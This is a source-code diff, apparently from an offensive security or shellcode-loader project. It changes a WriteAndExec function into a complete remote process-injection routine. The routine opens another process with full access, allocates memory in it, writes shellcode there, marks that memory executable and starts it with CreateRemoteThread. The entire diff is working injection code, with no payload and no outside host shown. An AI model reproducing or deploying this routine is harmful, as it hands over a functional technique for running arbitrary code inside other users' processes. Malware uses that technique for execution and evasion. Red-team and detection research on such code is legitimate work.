@@ -3,35 +3,47 @@
 #include "../../Utils/utilities.h"
 #include "ExecHeap.h"
 
-BOOL WriteAndExec(DWORD pid, LPVOID address, LPCSTR shellcode, SIZE_T size) {
+BOOL WriteAndExec(DWORD pid, LPCSTR shellcode, SIZE_T size) {
   Logger& logger = Logger::getInstance();
 
 #ifdef DEBUG
-  LOG_CALL("pid = %lu, address = %p, shellcode = %p, size = %lu", pid, address, shellcode, size);
+  LOG_CALL("pid = %lu, shellcode = %p, size = %lu", pid, shellcode, size);
 #endif
 
-  memcpy(address, shellcode, size);
-  DWORD oldProtect;
-
-  if (!VirtualProtect(address, 1, PAGE_EXECUTE_READ, &oldProtect)) {
-    VirtualFree(address, 0, MEM_RELEASE);
-    LOG_ERROR("Proteciton change failed.");
-    return FALSE;
-  }
   HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-
   if (processHandle == NULL) {
-    VirtualFree(address, 0, MEM_RELEASE);
     LOG_ERROR("Opening a handle failed.");
     return FALSE;
   }
 
-  LPTHREAD_START_ROUTINE threadStart = (LPTHREAD_START_ROUTINE)address;
+  LPVOID remoteAddress = VirtualAllocEx(processHandle, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  if (remoteAddress == NULL) {
+    CloseHandle(processHandle);
+    LOG_ERROR("Memory allocation failed.");
+    return FALSE;
+  }
+
+  if (!WriteProcessMemory(processHandle, remoteAddress, shellcode, size, NULL)) {
+    VirtualFreeEx(processHandle, remoteAddress, 0, MEM_RELEASE);
+    CloseHandle(processHandle);
+    LOG_ERROR("Writing to process memory failed.");
+    return FALSE;
+  }
+
+  DWORD oldProtect;
+  if (!VirtualProtectEx(processHandle, remoteAddress, size, PAGE_EXECUTE_READ, &oldProtect)) {
+    VirtualFreeEx(processHandle, remoteAddress, 0, MEM_RELEASE);
+    CloseHandle(processHandle);
+    LOG_ERROR("Protection change failed.");
+    return FALSE;
+  }
+
+  LPTHREAD_START_ROUTINE threadStart = (LPTHREAD_START_ROUTINE)remoteAddress;
   HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, threadStart, NULL, 0, NULL);
 
   if (threadHandle == NULL) {
+    VirtualFreeEx(processHandle, remoteAddress, 0, MEM_RELEASE);
     CloseHandle(processHandle);
-    VirtualFree(address, 0, MEM_RELEASE);
     LOG_ERROR("Thread creation failed.");
     return FALSE;
   }
